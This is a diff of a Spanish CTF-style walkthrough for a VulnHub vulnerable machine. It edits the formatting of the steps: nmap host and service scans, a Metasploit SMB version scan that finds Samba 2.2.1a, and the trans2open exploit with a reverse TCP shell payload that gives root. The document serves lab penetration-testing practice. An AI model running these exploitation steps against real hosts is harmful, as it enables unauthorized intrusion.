@@ -12,32 +12,13 @@ Puedes descargar la máquina vulnerable desde [vulnhub](https://www.vulnhub.com/
 
 ## Descubrimiento de hosts
 
-1. Escaneamos para descubrir hosts:
-nmap -sn <ip>/<rango>
+Escaneamos con `nmap -sn <ip>/<rango>`, encontramos la maquina en la ip `192.168.0.24`.
 
-Nos da el siguiente resultado:
+## Reconocimiento
 
-```
-Starting Nmap 7.80 ( https://nmap.org ) at 2024-09-10 09:23 CEST
-Nmap scan report for www.adsl.vf (192.168.0.1)
-Host is up (0.0048s latency).
-Nmap scan report for 192.168.0.10
-Host is up (0.082s latency).
-Nmap scan report for 192.168.0.16
-Host is up (0.00044s latency).
-Nmap scan report for 192.168.0.20
-Host is up (0.000081s latency).
-Nmap scan report for 192.168.0.24
-Host is up (0.00041s latency).
-Nmap done: 256 IP addresses (5 hosts up) scanned in 15.31 seconds
-```
-
-2. Escaneamos versiones
-nmap -sV <ip>
+Escaneamos con `nmap -sV 192.168.0.24` para realizar una enumeración de puertos y servicios.
 
 ```
- ~ nmap -sV 192.168.0.24
-Starting Nmap 7.80 ( https://nmap.org ) at 2024-09-10 09:26 CEST
 Nmap scan report for 192.168.0.24
 Host is up (0.0021s latency).
 Not shown: 994 closed ports
@@ -50,13 +31,15 @@ PORT      STATE SERVICE     VERSION
 32768/tcp open  status      1 (RPC #100024)
 ```
 
-Vemos que 192.168.0.24 es un redhat con varios puertos abiertos.
+Vemos que 192.168.0.24 es un **redhat** con varios puertos abiertos.
 
-Nos interesa el servicio de Samba, pero necesitamos conocer su version antes de atacar.
+Nos interesa el servicio de **Samba**, pero necesitamos conocer su version antes.
+
+## Explotación
 
 Con metasploit podemos ejecutar el siguiente scanner:
 
-```
+```bash
 msfconsole
 search /scanner/smb/ #para buscar
 use /auxiliary/scanner/smb/smb_version
@@ -66,7 +49,7 @@ set rhosts 192.168.0.24
 
 Al lanzarlo, obtenemos lo siguiente:
 
-```
+```bash
 [*] 192.168.0.24:139      - SMB Detected (versions:) (preferred dialect:) (signatures:optional)
 [*] 192.168.0.24:139      -   Host could not be identified: Unix (Samba 2.2.1a)
 [*] 192.168.0.24:         - Scanned 1 of 1 hosts (100% complete)
@@ -95,4 +78,4 @@ En concreto, aqui tenemos la vulnerabilidad trans2open, podemos buscarla con `se
 
 Debemos configurar el payload con `set payload linux/x86/shell_reverse_tcp` y el rhosts.
 
-Al lanzarlo con run obtenemos una shell con usuario root.
+Al lanzarlo con run obtenemos una shell con usuario **root**.
